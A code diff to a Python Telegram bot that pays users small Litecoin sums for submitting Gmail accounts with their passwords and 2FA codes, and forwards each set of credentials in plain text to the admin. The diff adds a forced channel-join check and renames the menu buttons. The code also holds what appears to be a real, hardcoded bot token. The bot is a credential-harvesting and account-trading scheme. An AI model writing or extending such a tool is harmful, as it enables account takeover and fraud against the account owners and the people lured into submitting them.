@@ -10,6 +10,7 @@ from aiohttp import web
 # Configuration
 BOT_TOKEN = "8924995974:AAEcOT5ChY4qlEl-1hguZJ_8nNFygqUOuZQ"
 ADMIN_ID = 5582627293
+CHANNEL_ID = "@A_ToolsX" # Force join channel username
 
 logging.basicConfig(level=logging.INFO)
 
@@ -29,7 +30,7 @@ class BotStates(StatesGroup):
     waiting_for_ltc_address = State()
     waiting_for_withdraw_amount = State()
 
-# Keyboards
+# --- Keyboards ---
 def get_main_menu():
     keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     keyboard.add("Register", "My account", "Balance", "Help")
@@ -37,22 +38,22 @@ def get_main_menu():
 
 def get_register_menu():
     keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    keyboard.add("Submit account", "Back to home screen")
+    keyboard.add("Submit account", "Cancel ❌")
     return keyboard
 
 def get_payout_menu():
     keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    keyboard.add("payout", "Back to home screen")
+    keyboard.add("payout", "Cancel ❌")
     return keyboard
 
 def get_ltc_menu():
     keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    keyboard.add("LTC", "Back to home screen")
+    keyboard.add("LTC", "Cancel ❌")
     return keyboard
 
 def get_back_menu():
     keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    keyboard.add("Back to home screen")
+    keyboard.add("Cancel ❌")
     return keyboard
 
 # Initialize User Data Function
@@ -64,21 +65,42 @@ def init_user(user_id):
             "accounts": []
         }
 
+# --- Force Join Check Function ---
+async def check_joined(user_id: int) -> bool:
+    try:
+        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
+        if member.status in ['member', 'administrator', 'creator']:
+            return True
+        return False
+    except Exception:
+        # If any error (like bot not admin in channel), allow user to proceed
+        return True
+
 # --- Start Command ---
 @dp.message_handler(commands=['start'], state='*')
 async def send_welcome(message: types.Message, state: FSMContext):
     await state.finish()
     init_user(message.from_user.id)
+    
+    if not await check_joined(message.from_user.id):
+        await message.answer(f"🚀 To use this bot, you must join our channel:\nhttps://t.me/A_ToolsX")
+        return
+        
     await message.reply("Welcome! Please select an option:", reply_markup=get_main_menu())
 
-@dp.message_handler(lambda message: message.text == "Back to home screen", state='*')
-async def back_home(message: types.Message, state: FSMContext):
+# --- Cancel Handler ---
+@dp.message_handler(lambda message: message.text == "Cancel ❌", state='*')
+async def cancel_process(message: types.Message, state: FSMContext):
     await state.finish()
-    await message.answer("Returned to main menu.", reply_markup=get_main_menu())
+    await message.answer("Process cancelled. Returned to main menu.", reply_markup=get_main_menu())
 
 # --- Register Flow ---
 @dp.message_handler(lambda message: message.text == "Register", state='*')
 async def handle_register(message: types.Message):
+    if not await check_joined(message.from_user.id):
+        await message.answer(f"🚀 To use this bot, you must join our channel:\nhttps://t.me/A_ToolsX")
+        return
+        
     await message.answer(
         "Do you want us to generate a login and password for you or you already have an account?",
         reply_markup=get_register_menu()
@@ -86,6 +108,10 @@ async def handle_register(message: types.Message):
 
 @dp.message_handler(lambda message: message.text == "Submit account", state='*')
 async def submit_account_start(message: types.Message):
+    if not await check_joined(message.from_user.id):
+        await message.answer(f"🚀 To use this bot, you must join our channel:\nhttps://t.me/A_ToolsX")
+        return
+        
     await message.answer("Gamil AC...", reply_markup=get_back_menu())
     await BotStates.waiting_for_gmail.set()
 
@@ -111,23 +137,19 @@ async def process_2fa(message: types.Message, state: FSMContext):
     password = data.get("password")
     two_fa = message.text
     
-    # Save account details
     account_info = {"gmail": gmail, "password": password, "2fa": two_fa, "status": "Pending"}
     user_data[user_id]["accounts"].append(account_info)
     
-    # Update Hold Balance
     user_data[user_id]["hold_balance"] += 0.17
     
     await message.answer("1 account submit successful\nHold balance 0.17", reply_markup=get_main_menu())
     
-    # Unique Admin Notification System
     admin_text = (
         f"📩 New Account Submitted!\n\n"
         f"User: {message.from_user.full_name} ({user_id})\n"
         f"Gmail: {gmail}\n"
         f"Password: {password}\n"
-        f"2FA: {two_fa}\n\n"
-        f"Use admin panel to review."
+        f"2FA: {two_fa}"
     )
     try:
         await bot.send_message(ADMIN_ID, admin_text)
@@ -184,7 +206,6 @@ async def process_withdraw(message: types.Message, state: FSMContext):
     user_data[user_id]["total_balance"] -= amount
     await message.answer(f"Withdrawal request of ${amount:.2f} submitted successfully!", reply_markup=get_main_menu())
     
-    # Notify Admin about Withdrawal
     data = await state.get_data()
     await bot.send_message(ADMIN_ID, f"💰 Withdrawal Request!\nUser: {user_id}\nAmount: ${amount:.2f}\nLTC Address: {data.get('ltc_address')}")
     await state.finish()
@@ -209,7 +230,6 @@ async def handle_my_account(message: types.Message):
 # --- Help Flow ---
 @dp.message_handler(lambda message: message.text == "Help", state='*')
 async def handle_help(message: types.Message):
-    # Generates a direct link to the admin profile
     try:
         admin_user = await bot.get_chat(ADMIN_ID)
         admin_username = admin_user.username
@@ -241,4 +261,5 @@ async def main():
 
 if __name__ == '__main__':
     asyncio.run(main())
+    
     
